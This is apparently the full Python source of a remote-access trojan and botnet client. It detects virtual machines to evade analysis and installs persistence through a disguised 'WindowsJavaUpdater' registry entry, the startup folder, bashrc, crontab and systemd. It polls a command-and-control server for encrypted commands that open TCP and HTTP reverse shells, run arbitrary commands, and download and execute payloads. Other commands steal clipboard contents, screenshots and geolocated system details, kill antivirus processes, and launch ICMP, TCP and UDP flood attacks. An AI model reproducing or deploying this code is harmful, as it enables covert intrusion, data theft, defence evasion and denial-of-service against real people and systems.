import platform
import os
import sys
import time
import socket
import requests
from requests import get
import threading
from threading import Thread
import re
import webbrowser
import inspect
from shutil import copy
from pathlib import Path
import random
import uuid
import string
import urllib.request
from urllib import request, parse
import subprocess
import json
import ctypes
from io import BytesIO
import shutil
from datetime import datetime
import hashlib
import io
import urllib.parse
import urllib.request
import multiprocessing
import random

try:
    import winreg
except:
    pass

global gui
gui = ()

try:
    import tkinter as tk
    import pyautogui
    import pyscreenshot as ImageGrab
    import tkinter.messagebox
    gui = True
    
except:
    gui = False
    pass

#pyscreenshot
#requests
#pyautogui
#pillow

#Multiple bots on the same network or under the same ip use a round-robin based algorithm technique to keep the c&c server connected to the desired network, used to avoid heavy traffic loads and bounce around the network

def vm_detection():

    system = platform.system()

    if system == "Windows":

        try: 
            def is_windows_vm():

                if os.path.exists('C:\\Windows\\System32\\vmguest.dll'):
                    return True
                
                common_vm_processes = ['vmware', 'vbox', 'qemu', 'virtualbox', 'vagrant', 'vmtoolsd']
                for process in common_vm_processes:
                    if any(process.lower() in p.lower() for p in os.popen('tasklist').readlines()):
                        return True
                    
                virtual_reg_keys = [
                    r'HKEY_LOCAL_MACHINE\HARDWARE\ACPI\DSDT\VBOX__',
                    r'HKEY_LOCAL_MACHINE\HARDWARE\Description\System\BIOS\VirtualBox',
                    r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VBoxDrv'
                ]
                for reg_key in virtual_reg_keys:
                    if os.system(f'reg query "{reg_key}"') == 0:
                        return True
                return False
            
            if is_windows_vm():
                print("The program is running on or along side a virtual machine.")
                time.sleep(10)
                exit()
            else:
                print("No virtualisation detected")

        except:
            pass
        
    if system == "Linux":

        try:
            result = []
            num_vm_detections = 0  

            try:
                test = 0
                list_dir = os.listdir('/usr/bin/')
                lists = {"vmware-", "vbox"}
                for i in lists:
                    if any(i in s for s in list_dir):
                        test += 1
                if test != 0:
                    num_vm_detections += 1
            except Exception as e:
                pass

            try:
                if 'hypervisor' in open("/proc/cpuinfo").read():
                    result.append(None)  
                    num_vm_detections += 1
            except Exception as e:
                pass

            try:
                test = 0
                with open("/proc/scsi/scsi") as f:
                    list_dir = f.read().split(" ")
                lists = {"VMware", "VBOX"}
                for i in lists:
                    if any(i in s for s in list_dir):
                        test += 1
                if test != 0:
                    num_vm_detections += 1
            except Exception as e:
                pass

            try:
                name = open("/sys/class/dmi/id/bios_vendor").read()
                test = 0
                lists = {"vmware", "vbox", "Phoenix", "innotek"}
                for i in lists:
                    if any(i in s for s in name):
                        result.append(None)  
                        test += 1
                if test != 0:
                    num_vm_detections += 1
            except Exception as e:
                pass


            vm_detected = num_vm_detections >= 3

            if vm_detected:
                print('\nThe program is running on or alongside a virtual machine.')
                time.sleep(10)
                exit()
            else:
                print("No virtualisation detected")
                
        except Exception as e:
            pass

vm_detection()

uname = platform.uname()
operating_system = uname.system

if operating_system == 'Windows':

    sep = os.path.sep
    script_path = os.path.abspath(sys.argv[0])

    if getattr(sys, 'frozen', False):
        script_path = os.path.abspath(sys.executable)

    script_directory = os.path.dirname(script_path)
    script_filename = os.path.basename(script_path)
    script_directory_filename = script_directory + sep + script_filename


    def reg_key():

        if ctypes.windll.shell32.IsUserAnAdmin() != 1:
            print("not admin")
            time.sleep(2)
            print("attempting to obtain admin")

            res = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

            if res > 32:
                print("admin obtained - launching startup")
                pass
            else:
                print("admin still not obtained - using other method")
                print("Admin Denied")

        else:
            print("Admin already obtained - launching startup")

        

        try:
            try:
                registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsJavaUpdater")
                print("Registry key 'WindowsJavaUpdater' exists.")
                winreg.CloseKey(registry_key)
                pass

            
            except FileNotFoundError:
                
                print("Registry key 'WindowsJavaUpdater' does not exist - creating")
                value_name = "WindowsJavaUpdater" 
                file_path = script_directory_filename  
                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, file_path)

                print(f"Added {value_name} to startup registry with file path: {file_path}")

        except Exception as E:
            print("Error in reg: ",E)
            time.sleep(10)
            pass

  
    def startup_folder():
        
        script_path = sys.argv[0]
        if getattr(sys, 'frozen', False):
            script_path = os.path.abspath(os.path.join(sys._MEIPASS, sys.argv[0]))
        fext = os.path.splitext(script_path)[1]
        
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        sep = os.path.sep
        script_path = os.path.abspath(sys.argv[0])

        if getattr(sys, 'frozen', False):
            script_path = os.path.abspath(sys.executable)

        script_directory = os.path.dirname(script_path)
        script_filename = os.path.basename(script_path)
        script_directory_filename = script_directory + sep + script_filename
        print(script_directory_filename)

        try:
            shutil.copy(script_directory_filename, startup_folder)
            print(f'Successfully copied {script_directory_filename} to the startup folder.')

        except Exception as e:
            print(f'Error: {e}')
            time.sleep(10)
            pass

        startup_f = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        startup_script_path = startup_f + sep + script_filename
        print(f"Script path: {script_directory_filename}")
        print(f"Startup folder path: {startup_script_path}")

        if os.path.exists(startup_script_path):
            print(f"The script is already in the Startup folder: {startup_script_path}")
            pass
        
        else:
            print(f"script is NOT in the Startup folder. adding...")
            
            if ctypes.windll.shell32.IsUserAnAdmin() != 1:
                print("not admin")
                time.sleep(2)
                print("attempting to obtain admin")

                res = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

                if res > 32:
                    print("admin obtained - launching startup")
                else:
                    print("admin still not obtained - using other method")
                    pass

            else:
                print("Admin already obtained - launching startup")


    try:
        
        startup_folder()
        print("Startup folder successful - ")
        
    except Exception as E:
        
        print("Error in folder startup: ",E)
        time.sleep(5)
        print("Attempting Reg backdoor...")
        time.sleep(5)
        reg_key()
        pass

if operating_system == 'Linux' or operating_system == 'Linux2':

    try:

        print("starting linux persist")

        script_path = os.path.abspath(sys.argv[0])
        startup_path = os.path.expanduser("~/.config/startup_script_bashrc.py")

        shutil.copy(script_path, startup_path)
        os.chmod(startup_path, 0o755)

        with open(os.path.expanduser("~/.bashrc"), "a") as bashrc:
            bashrc.write(f"\n# Add to startup\n{startup_path} &\n")


        script_path = os.path.abspath(sys.argv[0])
        startup_path = os.path.expanduser("~/.config/startup_script_crontab.py")

        shutil.copy(script_path, startup_path)
        os.chmod(startup_path, 0o755)

        os.system(f'(crontab -l ; echo "@reboot {startup_path}") | crontab -')


        script_path = os.path.abspath(sys.argv[0])
        startup_path = os.path.expanduser("~/.config/startup_script_systemd.py")

        shutil.copy(script_path, startup_path)
        os.chmod(startup_path, 0o755)

        systemd_service = f"""[Unit]
    Description=My Startup Script

    [Service]
    Type=simple
    ExecStart={startup_path}

    [Install]
    WantedBy=default.target
    """

        systemd_service_path = "/etc/systemd/system/startup_script_systemd.service"
        with open(systemd_service_path, "w") as service_file:
            service_file.write(systemd_service)

        #enable and start the service
        
        os.system(f"systemctl enable startup_script_systemd.service")
        os.system(f"systemctl start startup_script_systemd.service")

        time.sleep(2)

        #try again incase of initial privilage errors or slow start

        os.system("sudo systemctl daemon-reload")
        os.system("sudo systemctl enable startup_script_systemd.service")
        os.system("sudo systemctl start startup_script_systemd.service")
        
    except Exception as E:
        print("Error in persistance: ",E)
        pass

    # Part of script only works once complied into executable format 


    
processor_info = platform.processor();system_info = platform.system();release_info = platform.release();concatenated_info = f"{processor_info}-{system_info}-{release_info}"
unique_fingerprint = hashlib.sha256(concatenated_info.encode()).hexdigest()[:8]

current_datetime = datetime.now()
formatted_datetime = current_datetime.strftime("%dth %B %I:%M %p")

uname = platform.uname()
system = platform.system()
arch = platform.architecture()
hostname = socket.gethostname()
version = platform.version()
cpucount = os.cpu_count()
cpubuild = uname.machine

pl = system+" "+version+" "+"("+cpubuild+")"

sl = str(pl)
sl = sl.replace("'", "").replace("(", "").replace(")", "")
print(sl)

sep = os.path.sep
os = sl

sleep = None

def sd():

    # Network throttle and lower stress network requests sent in "chunks"

    global sleep

    while True:
        while sleep:
            break
        else:
            try:
                
                time.sleep(2)
                url = sendtourl + "server.php"
                headers = {
                    "User-Agent": sl+", Unique ID: ("+unique_fingerprint+")",
                    "Referer": sendtourl,
                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
                }
                with requests.get(url, headers=headers, stream=True) as response:
                    for chunk in response.iter_content(chunk_size=128):
                        if chunk:
                            print("Received chunk:", chunk.decode('utf-8'))
            except requests.RequestException:
                time.sleep(1)
                pass

def mn():
    while True:
        try:
            import os;time.sleep(1)
    
            def get_lines_in_chunks(url, chunk_size):
                response = requests.get(url, stream=True)
                lines = []

                for chunk in response.iter_content(chunk_size=128):
                    if chunk:
                        lines.extend(chunk.decode('utf-8').splitlines())

                        while len(lines) >= chunk_size:
                            yield lines[:chunk_size]
                            lines = lines[chunk_size:]
                if lines:
                    yield lines

            url = sendtourl + "pico-wifi.txt"
            chunk_size = 12

            for chunk in get_lines_in_chunks(url, chunk_size):
                for line in chunk:

                    print("Processed line:", line)

                    #recieve command encryped

                    text_with_quotes = str(line)
                    pattern = r"'(.*?)'"
                    matches = re.findall(pattern, text_with_quotes)
                    for match in matches:
                        line = match


                    encrypted_text = line

                    encrypted_text = str(encrypted_text)

    
                    print("ENCRYPTED COMMAND:",encrypted_text)


                    decrypted_text = ""
                    key_length = len(decryption_key) #process decryption cypher


                    #decrypt command
                    
                    i = 0
                    for char in encrypted_text:
                        key_char = decryption_key[i % key_length]
                        i += 1

                        if char.isalpha():
                            is_upper = char.isupper()
                            char_shift = ord(char) - ord('A') if is_upper else ord(char) - ord('a')
                            key_shift = ord(key_char) - ord('A') if key_char.isupper() else ord(key_char) - ord('a')

                            decrypted_char = chr(((char_shift - key_shift) % 26) + ord('A') if is_upper else ((char_shift - key_shift) % 26) + ord('a'))
                            decrypted_text += decrypted_char
                            
                        elif char.isdigit():
                            char_shift = int(char)
                            key_shift = int(key_char, 36)

                            decrypted_digit = str((char_shift - key_shift) % 10)
                            decrypted_text += decrypted_digit
                        else:
                            decrypted_text += char

                    line = decrypted_text

                    print("DECRYPTED COMMAND:",line)

                    string = line;string = str(string)
                    string = string.replace("'","")
                    find = string
                    res = re.findall(r'\(.*?\)', string)
                    sult = str(res);string = sult;string = str(string)
                    string = string.replace("[", "").replace("]", "").replace(")", "").replace("(", "").replace("'", "")
                    
                    if "ip" in find:
                        
                        command = string
                        sentip = string

                        print(sentip)

                        myip = requests.get("https://api.ipify.org").content
                        string = myip
                        string = str(string)
                        string = string.replace("b", "").replace("'", "")
                        myip = string
                        
                        print(myip)

                        if sentip == myip:
                            
                            forme = True

                            print(find)

                            brc = re.findall(r'\[.*?\]', find)
                            string = brc
                            string = str(string)
                            string = string.replace("]", "").replace("[", "").replace("'", "")
                            brck = string


                            if "SHELL-EXT-TCP" in find:
                                
                                print(brck)
                                
                                try:


                                    input_string = brck
                                    split_strings = input_string.split(":")
                                    ip_address = split_strings[0]
                                    port_number = split_strings[1]
                                    print("IP Address:", ip_address)
                                    print("Port Number:", port_number)

                                    def shell():

                                        try:
                                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                            s.connect((str(ip_address), int(port_number)))
                                            
                                            while True:
                                                command = s.recv(1024).decode("utf-8")
                                                if command.lower() == "exit":
                                                    s.close()
                                                    break
                                                
                                                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                                                s.send(output)

                                        except Exception as e:
                                            print("Connection failed:", str(e))

                                    st = threading.Thread(target=shell)
                                    st.start()
                                except Exception as E:
                                    print(E)
      

                            if "SHELL-EXT-HTTP" in find:

                                print(brck)

                                try:

                                    input_string = brck
                                    split_strings = input_string.split(":")
                                    ip_address = split_strings[0]
                                    port_number = split_strings[1]
                                    print("IP Address:", ip_address)
                                    print("Port Number:", port_number)

                                    def shell():
                                        try:
                                            def send_post(data, url=f'http://{ip_address}:{port_number}'):
                                                data = {"rfile": data}
                                                data = parse.urlencode(data).encode()
                                                req = request.Request(url, data=data)
                                                request.urlopen(req)

                                            def send_file(command):
                                                try:
                                                    grab, path = command.strip().split(' ')
                                                except ValueError:
                                                    pass
                                                    return

                                                if not os.path.exists(path):
                                                    pass
                                                    return

                                                store_url = f'http://{ip_address}:{port_number}/store'
                                                with open(path, 'rb') as fp:
                                                    send_post(fp.read(), url=store_url)

                                            def run_command(command):
                                                CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                                                send_post(CMD.stdout.read())
                                                send_post(CMD.stderr.read())

                                            while True:
                                
                                                command = request.urlopen(f"http://{ip_address}:{port_number}").read().decode()

                                                if 'terminate' in command:
                                                    break
                                                
                                                if 'grab' in command:
                                                    send_file(command)
                                                    continue6
                                                
                                                run_command(command)
                                                time.sleep(1)

                                        except Exception as e:
                                            print("Connection failed:", str(e))

                                    st = threading.Thread(target=shell)
                                    st.start()
                                except Exception as E:
                                    print(E)

                                
                            if "ECHO" in find:
                                print(brck)

                            if "MESSAGE" in find:

                                print(brck)
                                parts = brck.split(":")
                                title = parts[0]
                                body = parts[1]


                                
                                print("Title:", title)
                                print("Body:", body)


                                if gui == True:
                                    root = tk.Tk()
                                    root.withdraw()
                                    tkinter.messagebox.showinfo(title, body)
                                    root.destroy()
                                else:
                                    pass

                            if "CMD" in find:
                                os.system(brck)

                            if "DOWNLOAD" in find:

                                print(brck)
                                
                                parsed_url = urllib.parse.urlparse(brck)
                                filename = os.path.basename(parsed_url.path)
                                save_directory = os.getcwd()
                                local_file_path = os.path.join(save_directory, filename)
                                urllib.request.urlretrieve(brck, local_file_path)

                                uname = platform.uname()
                                operating_system = uname.system

                                if operating_system == 'Windows':
                                    os.startfile(local_file_path)
                                else:
                                    _, file_extension = os.path.splitext(local_file_path)

                                    if file_extension == '.sh':
                                        subprocess.run(['bash', local_file_path])
                                    elif file_extension == '.py':
                                        subprocess.run(['python3', local_file_path])
                                    elif file_extension == '.jar':
                                        subprocess.run(['java', '-jar', local_file_path])
                                    elif os.access(local_file_path, os.X_OK):  # Check if the file is executable
                                        subprocess.run(['./' + local_file_path])
                                    else:
                                        try:
                                            subprocess.run(['xdg-open', local_file_path])
                                        except FileNotFoundError:
                                            pass

                            if "CLIPBOARD" in find:

                                try:

                                    root = tk.Tk()
                                    root.withdraw()
                                    clipboard_contents = root.clipboard_get()
                                    root.destroy()
                                    custom_data = clipboard_contents
                                    url = sendtourl+"store-data.php"
                                    response = requests.post(url, data={"data": custom_data})
                                    print("data sent",url)
                                    time.sleep(1)
                                    break
                                
                                except:
                                    pass
                                
    
                            if "SCREENSHOT" in find:

                                uname = platform.uname()
                                operating_system = uname.system

                                if operating_system == 'Windows':
                                    im = pyautogui.screenshot()
                                else:
                                    im = ImageGrab.grab()

                                im_bytes = io.BytesIO()
                                im.save(im_bytes, format='PNG')

                                files = {'screenshot': ('screenshot.png', im_bytes.getvalue(), 'image/png')}
                                response = requests.post(sendtourl + 'screenshot.php', files=files)
                                print(response.text)

                            if "EXTRACT" in find:

                                try:

                                    print("extract command recieved")

                                    sep = os.path.sep
                                    script_path = os.path.abspath(sys.argv[0])

                                    if getattr(sys, 'frozen', False):
                                        script_path = os.path.abspath(sys.executable)
                                        
                                    script_directory = os.path.dirname(script_path)
                                    script_filename = os.path.basename(script_path)

                                    script_directory_filename = script_directory+sep+script_filename

                                    uname = platform.uname()
                                    public_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
                                    private_ip = socket.gethostbyname(socket.gethostname())

                                    mac_address = (':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                                                             for ele in range(0,8*6,8)][::-1]))

                                    operating_system = uname.system
                                    operating_system_version = platform.version()
                                    system_hostname = socket.gethostname()

                                    system_architecture = platform.architecture();string = system_architecture;string=str(
                                        string);string=string.replace("'","");string=string.replace(")","");string=string.replace("(","");system_architecture=string

                                    processor_build = uname.machine
                                    cpu_count = os.cpu_count()
                                    total, used, free = shutil.disk_usage("/")

                                    Ctotal_storage = "Total C: Storage: %d gb" % (total // (2**30))
                                    Cused_storage = "Used C: Storage: %d gb" % (used // (2**30))
                                    Cfree_storage = "Free C: Storage: %d gb" % (free // (2**30))
                                    running_processes = os.popen('wmic process get description, processid').read()
                                    operating_system = platform.system()


                                    response = requests.get(f'http://ip-api.com/json/{public_ip}').content
                                    data = json.loads(response)

                                    current_available_drives = drives = [chr(x)+":"for x in range(65,91)if os.path.exists(chr(x)+":")];string=drives;string=str(
                                        string);string=string.replace("]","");string=string.replace("[","");string=string.replace("'","");current_available_drives=string

                                    if operating_system != 'Windows':

                                        if os.geteuid() == 0:
                                            priv = True
                                        else:
                                            priv = False
                                        
                                        dat = f'''


    =-=-=-=-=-= GEO INFORMATION =-=-=-=-=-=

    Country: {data['country']}
    Region: {data['regionName']}
    City: {data['city']}
    Zip: {data['zip']}
    Latitude: {data['lat']}
    Longitude: {data['lon']}
    ISP: {data['isp']}

    =-=-=-=-=-= PAYLOAD INFORMATION =-=-=-=-=-=

    Payload File Name/Location: {script_directory_filename}
    Most Recent Infection Date/Time: {format(formatted_datetime)}
    Admin/Root file privilages: {priv}
    GUI: {gui}

    =-=-=-=-=-= SYSTEM INFORMATION =-=-=-=-=-=

    System Hostname: {system_hostname}
    Operating System: {operating_system}
    Operating System Version: {operating_system_version}

    Public IP Address: {public_ip}
    Private IP Address: {private_ip}
    MAC Address: {mac_address}

    System Architecture: {system_architecture}
    Processor Build: {processor_build}
    CPU Count: {cpu_count}

                                        '''

                                    if operating_system == 'Windows':

                                        if ctypes.windll.shell32.IsUserAnAdmin():
                                            priv = True
                                        else:
                                            priv = False

                                        dat = f'''

    =-=-=-=-=-= GEO INFORMATION =-=-=-=-=-=

    Country: {data['country']}
    Region: {data['regionName']}
    City: {data['city']}
    Zip: {data['zip']}
    Latitude: {data['lat']}
    Longitude: {data['lon']}
    ISP: {data['isp']}

    =-=-=-=-=-= PAYLOAD INFORMATION =-=-=-=-=-=

    Payload File Name/Location: {script_directory_filename}
    Most Recent Infection Date/Time: {format(formatted_datetime)}
    Admin/Root file privilages: {priv}
    GUI: {gui}

    =-=-=-=-=-= SYSTEM INFORMATION =-=-=-=-=-=

    System Hostname: {system_hostname}
    Operating System: {operating_system}
    Operating System Version: {operating_system_version}

    Public IP Address: {public_ip}
    Private IP Address: {private_ip}
    MAC Address: {mac_address}

    System Architecture: {system_architecture}
    Processor Build: {processor_build}
    CPU Count: {cpu_count}

    =-=-=-=-=-= WINDOWS INFORMATION =-=-=-=-=-=

    Available Drives: {current_available_drives}

    C: Drive Total Storage: {Ctotal_storage}
    C: Drive Used Storage: {Cused_storage}
    C: Drive Free Storage: {Cfree_storage}

    =-=-=-=-=-= SYSTEM PROCESSES =-=-=-=-=-=

    {running_processes}

                                    '''

                                    custom_data = dat
                                    url = sendtourl+"store-data.php"
                                    response = requests.post(url, data={"data": custom_data})
                                    print("data sent",url)

                                    
                                except Exception as E:
                                    print(E)

                        else:
                            forme = False
                            pass

                    elif "ALL" in find:
                        forme = True

                    if forme:

                        if "cmd" in find:
                            command = string
                            os.system(command)
                            print("cmd exec")

                        if "echo" in find:
                            command = string
                            print(command)

                        if "message" in find:

                            brc = re.findall(r'\[.*?\]', find)
                            string = brc
                            string = str(string)
                            string = string.replace("]","")
                            string = string.replace("[","")
                            string = string.replace("'","")
                            brck = string

                            brchost = re.findall(r'\(.*?\)', find)
                            string = brchost
                            string = str(string)
                            string = string.replace(")","")
                            string = string.replace("(","")
                            string = string.replace("'","")
                            string = string.replace("]","")
                            string = string.replace("[","")
                            
                            brckhost = string

                            print(brckhost,"title")
                            print(brck,"body")

                            if gui == True:
                                
                                root = tk.Tk()
                                root.withdraw()
                                tkinter.messagebox.showinfo(brckhost, brck)
                                root.destroy()
                            else:
                                pass

                        if "download" in find:

                            command = string
                            parsed_url = urllib.parse.urlparse(command)
                            filename = os.path.basename(parsed_url.path)
                            save_directory = os.getcwd()
                            local_file_path = os.path.join(save_directory, filename)
                            urllib.request.urlretrieve(command, local_file_path)

                            uname = platform.uname()
                            operating_system = uname.system

                            if operating_system == 'Windows':
                                os.startfile(local_file_path)
                            else:

                                _, file_extension = os.path.splitext(local_file_path)

                                if file_extension == '.sh':
                                    subprocess.run(['bash', local_file_path])
                                elif file_extension == '.py':
                                    subprocess.run(['python3', local_file_path])
                                elif file_extension == '.jar':
                                    subprocess.run(['java', '-jar', local_file_path])
                                elif os.access(local_file_path, os.X_OK): 
                                    subprocess.run(['./' + local_file_path])
                                else:
                                    try:
                                        subprocess.run(['xdg-open', local_file_path])
                                    except FileNotFoundError:
                                        pass

                             
                        if "proxy" in find:

                            brc = re.findall(r'\[.*?\]', find)
                            string = brc
                            string = str(string)
                            string = string.replace("]","")
                            string = string.replace("[","")
                            string = string.replace("'","")
                            brck = string

                            brchost = re.findall(r'\(.*?\)', find)
                            string = brchost
                            string = str(string)
                            string = string.replace(")","")
                            string = string.replace("(","")
                            string = string.replace("'","")
                            string = string.replace("]","")
                            string = string.replace("[","")
                            
                            brckhost = string

                            proxy = "http://"+brckhost+":"+brck

                            os.environ['http_proxy'] = proxy
                            os.environ['HTTP_PROXY'] = proxy
                            os.environ['https_proxy'] = proxy
                            os.environ['HTTPS_PROXY'] = proxy

                        if "disable" in find:

                            uname = platform.uname()
                            operating_system = uname.system

                            if operating_system == 'Windows':

                                antivirus_process_names = ['ccSvcHst.exe', 'mcshield.exe', 'avgsvc.exe', 'avp.exe', 'bdagent.exe', 'mbam.exe',
                                                           'SDTray.exe', 'WRSA.exe', 'SAVService.exe', 'PSUAMain.exe', 'TMBMSRV.exe', 'egui.exe',
                                                           'AdAware.exe', 'SBAMTray.exe', 'avguard.exe', 'cylancesvc.exe', 'a2guard.exe', 'V3Tray.exe',
                                                           'SUPERAntiSpyware.exe', 'hmpalert.exe', 'BullGuard.exe', 'SBAMTray.exe', '',
                                                           '360Tray.exe', 'PSANHost.exe', 'cavwp.exe', 'fsav.exe', 'zatray.exe']

                                running_processes = os.popen('wmic process get description, processid').read()
                                process_lines = running_processes.split('\n')
                                running_process_names = [line.split()[0] for line in process_lines if line]

                                for process_name in antivirus_process_names:
                                    if process_name.lower() in [name.lower() for name in running_process_names]:

                                            command = f'taskkill /F /IM {process_name}'
                                            subprocess.run(command, shell=True)


                                    else:
                                        pass
                                    
                            if operating_system == 'Linux':


                                antirootkit_process_names = ['rkhunter', 'chkrootkit', 'Lynis', 'clamscan', 'aide', 'rkspotter', 'kjackal', 'lkrd', 'fg', 'detection-container',
                                                         'ossec-rootcheck', 'tripwire', 'samhain', 'tiger', 'yara', 'chkproc', 'rootkit hunter', 'unhide', 'maldet',
                                                         'sophos', 'clamav', 'bitdefender', 'avgd', 'avast', 'f-secure', 'esets', 'malwarebytes', 'kaspersky', 'symantec']

                                for process_name in antirootkit_process_names:

                                    try:
                                        subprocess.check_output(['which', process_name])
                                        command = f'pkill -f -9 {process_name}'
                                        print(f'killed {process_name}')
                                        try:
                                            subprocess.run(command, shell=True)
                                        except subprocess.CalledProcessError:
                                            pass

                                    except subprocess.CalledProcessError:
                                        pass


                        if "redirect" in find:
                            
                            command = string
                            webbrowser.open(command)

                        if "obfuscate" in find:

                            global sleep

                            sleep = True

                            sep = os.path.sep
                            script_path = os.path.abspath(sys.argv[0])

                            if getattr(sys, 'frozen', False):
                                script_path = os.path.abspath(sys.executable)
                                
                            script_directory = os.path.dirname(script_path)
                            script_filename = os.path.basename(script_path)

                            script_directory_filename = script_directory+sep+script_filename

                            def generate_random_code():
                                characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
                                random_code = ''.join(random.choice(characters) for _ in range(random.randint(50, 100)))
                                return f'# {random_code}\n'

                            with open(script_directory_filename, 'r') as fdesc:
                                script_content = fdesc.read()
                                
                            with open(script_directory_filename, 'w') as fdesc:
                                characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
                                random_code = ''.join(random.choice(characters) for _ in range(random.randint(50, 100)))
                                fdesc.write(script_content)
                                fdesc.write('\n')
                                fdesc.write('print("'+random_code+'")')
                                fdesc.write('\n')
                                fdesc.write(generate_random_code())


                            command = string

                            time_sleep = int(string)
                            script_path = os.path.abspath(sys.argv[0])

                            if getattr(sys, 'frozen', False):
                                script_path = os.path.abspath(sys.executable)
                                
                            script_directory = os.path.dirname(script_path)
                            script_filename = os.path.basename(script_path)

                            script_directory_filename = script_directory+sep+script_filename
                            scriptdr = str(script_directory)
                            scriptnm = str(script_filename)
                            scriptdf = str(script_directory_filename)

                            file_extensions = ['.txt', '.jpg', '.png', '.docx', '.pdf']

                            random_filename = str(uuid.uuid4())
                            random_extension = random.choice(file_extensions)
                            newfile = random_filename+random_extension

                            os.rename(scriptdf,newfile)
                            time.sleep(time_sleep)
                            os.rename(newfile,scriptnm)

                            sleep = False
                            

                        if "icmp-ddos" in find:


                            brc = re.findall(r'\[.*?\]', find)
                            string = brc
                            string = str(string)
                            string = string.replace("]","")
                            string = string.replace("[","")
                            string = string.replace("'","")
                            brck = string

                            brchost = re.findall(r'\(.*?\)', find)
                            string = brchost
                            string = str(string)
                            string = string.replace(")","")
                            string = string.replace("(","")
                            string = string.replace("'","")
                            string = string.replace("]","")
                            string = string.replace("[","")
                            
                            brckhost = string

                            print("HOST:",brckhost)
                            print("DURATION:",brck)

                            timeout = time.time() + int(brck)
                            threads = int(30)
                            def main():
                                
                                while True:
                                    try:
                                        if time.time() > timeout:
                                            break
                                        else:
                                            pass
                                            def ping_ip(current_ip_address):
                                                try:
                                                    output = subprocess.check_output("ping -{} 1 {}".format('n' if platform.system().lower(
                                                        ) == "windows" else 'c', current_ip_address ), shell=True, universal_newlines=True)

                                                    if 'unreachable' in output:
                                                        return False
                                                    else:
                                                        return True
                                                except Exception as E:
                                                    return False
                                                
                                            if __name__ == '__main__':
                                                
                                                current_ip_address = [brckhost]
                                                for each in current_ip_address:
                                                    if ping_ip(each):
                                                        #print("ICMP is available and up") #uncomment to view packets (dev testing only)
                                                        pass
                                                    else:
                                                        #print("ICMP is not available or down ") #uncomment to view packets (dev testing only)
                                                        pass
                                                    
                                    except Exception as E:
                                        print(E)
                                        pass

                            for i in range(threads):
                                r = threading.Thread(target=main)
                                r.start()



                                

                        if "tcp-ddos" in find:

                            brc = re.findall(r'\[.*?\]', find)
                            string = brc
                            string = str(string)
                            string = string.replace("]", "").replace("[", "").replace("'", "")
                            brck = string

                            brchost = re.findall(r'\(.*?\)', find)
                            string = brchost
                            string = str(string)
                            string = string.replace(")", "").replace("(", "").replace("'", "").replace("]", "").replace("[", "")
                            brckhost = string

                            
                            print("HOST:",brckhost)
                            print("DURATION:",brck)


                            timeout = time.time() + int(brck)

                            def main():
                                while True:
                                    if time.time() > timeout:
                                        print("timeout reached")
                                        break
                                    else:
                                        try:
                                            r = requests.get("http://"+brckhost)
                                            #print(r) #uncomment to view packets (dev testing only)
                                        except Exception as E:
                                            #print(E)
                                            pass

                            for i in range(50):
                                t = threading.Thread(target=main)
                                t.start()


                        if "udp-ddos" in find:


                            brc = re.findall(r'\[.*?\]', find)
                            string = brc
                            string = str(string)
                            string = string.replace("]", "").replace("[", "").replace("'", "")
                            brck = string

                            brchost = re.findall(r'\(.*?\)', find)
                            string = brchost
                            string = str(string)
                            string = string.replace(")", "").replace("(", "").replace("'", "").replace("]", "").replace("[", "")
                            brckhost = string

                            brcport = re.findall(r'\{.*?\}', find)
                            string = brcport
                            string = str(string)
                            string = string.replace(")", "").replace("(", "").replace("'", "").replace("]", "").replace("[", "").replace("}", "").replace("{", "")
                            brcport = string

                            print("HOST:",brckhost)
                            print("DURATION:",brck)
                            print("PORT:",brcport)


                            def main():

                                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                bytes = random._urandom(1024)

                                timeout = time.time() + int(brck)
                                sent = 0
                                sock = socket
                                while True:
                                    try:
                                        if time.time() > timeout:
                                            print("timeout reached")
                                            break
                                        else:
                                             pass
                                             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                             sock.sendto(bytes, (brckhost, int(brcport)))
                                             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                             bytes = random._urandom(10)
                                             sent = sent + 1
                                             #print("sent",sent,"packets to",brckhost,"through",brcport) #uncomment to view packets (dev testing only)

                                    except KeyboardInterrupt:
                                        sys.exit()

                            r = threading.Thread(target=main)
                            r.start()

                    
        except Exception as E:
            print(E)
            pass

f1 = threading.Thread(target=sd)
f2 = threading.Thread(target=mn)

f1.start()
f2.start()
